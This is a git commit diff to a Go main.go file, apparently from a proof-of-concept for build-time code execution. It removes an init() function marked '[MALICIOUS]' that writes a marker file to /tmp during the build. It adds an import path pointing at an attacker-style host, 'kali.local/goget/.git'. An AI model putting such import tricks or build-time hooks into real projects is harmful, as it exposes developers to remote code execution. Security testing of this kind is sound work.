5d36cb9f6e4918779eaf366566bdc673234791d7
Adham Adel <luadham@gmail.com>
2025-08-14 01:48:25 +0200

    Update main.go

--- main.go
+++ main.go
@@ -1,17 +1,5 @@
 package main
 
-import (
-    "fmt"
-    "os"
-)
+import "kali.local/goget/.git"
 
-func init() {
-    fmt.Println("[MALICIOUS] This code runs during build!")
-    f, _ := os.Create("/tmp/poc_was_here")
-    f.WriteString("Exploit ran successfully!\n")
-    f.Close()
-}
-
-func main() {
-    fmt.Println("Normal execution")
-}
+func main() {}
